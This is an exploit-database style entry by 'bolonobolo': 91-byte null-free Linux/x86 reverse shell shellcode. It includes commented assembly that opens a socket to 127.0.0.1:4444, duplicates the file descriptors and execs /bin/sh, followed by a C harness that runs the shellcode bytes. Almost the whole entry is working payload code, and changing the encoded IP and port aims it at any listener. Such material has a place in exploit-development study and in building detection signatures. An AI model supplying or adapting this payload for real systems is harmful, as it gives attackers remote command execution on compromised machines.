# Exploit Title: Linux/x86 - Reverse Shell NULL free 127.0.0.1:4444 Shellcode (91 bytes)
# Date: 2019-10-16
# Author:  bolonobolo
# Tested on: Linux x86
# Software: N/A
# CVE: N/A

/*
global _start

section .text
_start:


	;socket()
	xor ecx, ecx        ; xoring ECX
	xor ebx, ebx        ; xoring EBX
	mul ebx             ; xoring EAX and EDX
	inc cl              ; ECX should be 1
	inc bl
	inc bl              ; EBX should be 2
	mov ax, 0x167       ;
	int 0x80            ; call socket()

	;connect()          ; move the return value of socket
	xchg ebx, eax       ; from EAX to EBX ready for the next syscalls

	; push sockaddr structure in the stack
	dec cl
	push ecx                ; unused char (0)

	; move the lenght (16 bytes) of IP in EDX
	mov dl, 0x16

	; the ip address 1.0.0.127 could be 4.3.3.130 to avoid NULL bytes
	mov ecx, 0x04030382              ; mov ip in ecx
	sub ecx, 0x03030303              ; subtract 3.3.3.3 from ip
	push ecx                         ; load the real ip in the stack
	push word 0x5c11                 ; port 4444
	push word 0x02                   ; AF_INET family
	lea ecx, [esp]
	                                 ; EBX still contain the value of the
opened socket
	mov ax, 0x16a
	int 0x80

	; dup2()
	    xor ecx, ecx
	    mov cl, 0x3

	dup2:
	    xor eax, eax
	                                 ; EBX still contain the value of the
opened socket
	    mov al, 0x3f
	    dec cl
	    int 0x80
	    jnz dup2

	; execve() from the previous polymorphic analysis 25 bytes
	cdq                     ; xor edx
	mul edx                 ; xor eax
	lea ecx, [eax]          ; xor ecx
	mov esi, 0x68732f2f
	mov edi, 0x6e69622f
	push ecx                ; push NULL in stack
	push esi                ; push hs/ in stack
	push edi                ; push nib// in stack
	lea ebx, [esp]          ; load stack pointer to ebx
	mov al, 0xb             ; load execve in eax
	int 0x80
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\x31\xdb\xf7\xe3\xfe\xc1\xfe\xc3\xfe\xc3\x66\xb8\x67\x01\xcd\x80\x93\xfe\xc9\x51\xb2\x16\xb9\x82\x03\x03\x04\x81\xe9\x03\x03\x03\x03\x51\x66\x68\x11\x5c\x66\x6a\x02\x8d\x0c\x24\x66\xb8\x6a\x01\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}